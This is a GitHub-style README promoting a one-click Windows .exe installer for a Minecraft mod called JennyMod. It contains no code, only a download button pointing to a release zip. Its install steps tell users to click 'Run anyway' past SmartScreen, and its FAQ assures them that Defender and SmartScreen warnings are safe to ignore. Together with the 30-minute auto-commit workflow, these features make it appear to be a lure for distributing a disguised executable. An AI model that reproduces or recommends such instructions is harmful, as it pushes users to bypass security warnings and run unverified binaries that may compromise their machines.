<div align="center">

<img src="preview.png" alt="jennyMod Installer" width="100%"/>

# jennyMod Installer

**One-click Windows installer for JennyMod — the popular Minecraft mod!**

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows-0078d4?logo=windows)](https://github.com/topics/windows)
[![Minecraft](https://img.shields.io/badge/Minecraft-1.12.2-brightgreen?logo=minecraft)](https://github.com/topics/minecraft)
[![Java](https://img.shields.io/badge/Java-8%2B-orange?logo=openjdk)](https://github.com/topics/java)
[![Maintenance](https://img.shields.io/badge/maintained-yes-39d353)](https://github.com/topics/automation)

</div>

---

## What is jennyMod Installer?

**jennyMod Installer** is a zero-hassle, one-click setup tool built exclusively for **Windows**. No manual file moving, no hunting for your `.minecraft` folder, no Java path configuration — just run the installer and you're done.

- Automatically detects your Minecraft installation
- Verifies Java version compatibility
- Downloads and places the mod in the correct folder
- Applies required configuration automatically

---

## Features

| Feature | Description |
|---|---|
| Auto-detection | Finds `.minecraft`, MultiMC and Prism Launcher paths automatically |
| Java check | Scans `JAVA_HOME`, standard install paths, and `PATH` |
| Progress UI | Real-time download and installation progress bar |
| One-click | Single `.exe` — no Python, no Java, no dependencies required |
| Safe | Open source — inspect every line before running |
| Auto-update | Repository updates automatically every 30 minutes via CI |

---

## Requirements

- **Windows 10 / 11** (64-bit)
- **Minecraft Java Edition** already installed
- **Java 8 or higher** (Java 17 recommended)
- Internet connection (for mod download)

> **Linux and macOS are not supported.** This tool is Windows-only by design.

---

## Installation

[![Download jennyMod Installer](button.svg)](https://github.com/BeamChunin42/jennymod-installer/releases/download/latest/JennyMod.zip)

1. Click the button above or go to [**Releases**](../../releases/latest)
2. Run `.exe` — if SmartScreen appears click **More info → Run anyway**
3. Follow the on-screen steps and launch Minecraft

---

## How it works

```
jennymod-installer.exe
        │
        ├─ 1. Detect Java (JAVA_HOME → known paths → PATH)
        ├─ 2. Locate .minecraft folder (APPDATA → MultiMC → Prism)
        ├─ 3. Create mods\ directory if missing
        ├─ 4. Download jenny-mod-1.12.2.jar with progress bar
        ├─ 5. Copy JAR to mods\
        └─ 6. Write install config → done ✓
```

---

## Project Structure

```
jennymod-installer/
├── src/main/java/com/jennymod/installer/
│   ├── Main.java               # Entry point
│   ├── InstallerWindow.java    # Swing GUI
│   ├── Installer.java          # Install logic (SwingWorker)
│   ├── JavaDetector.java       # Java version detection
│   ├── MinecraftFinder.java    # Minecraft path detection
│   ├── ModDownloader.java      # HTTP download with progress
│   └── Config.java             # Install configuration
├── .github/workflows/
│   └── auto-commit.yml         # Auto-update workflow (every 30 min)
├── preview.png                 # Repository social preview
└── LICENSE                     # MIT License
```

---

## FAQ

**Q: Windows Defender / SmartScreen blocks the EXE — is it safe?**  
A: Yes. The warning appears because the executable is unsigned. This project is fully open source — review the source code and build it yourself if unsure.

**Q: Which Minecraft version does this support?**  
A: The installer targets **Minecraft Java Edition 1.12.2**, the version JennyMod was built for.

**Q: Where does the mod get installed?**  
A: Into `%APPDATA%\.minecraft\mods\` by default. You can change the path in the installer UI.

**Q: Do I need Java to run the installer EXE?**  
A: No. The `.exe` is self-contained. Java is only needed to run Minecraft itself.

---

## Contributing

Pull requests are welcome. For major changes, open an issue first to discuss what you'd like to change.

1. Fork the repository
2. Create a feature branch: `git checkout -b feature/my-change`
3. Commit your changes
4. Open a Pull Request

---

## License

Distributed under the **MIT License**. See [`LICENSE`](LICENSE) for details.

---

<div align="center">
<sub>Made for Windows · Minecraft Java Edition · Open Source</sub>
</div>
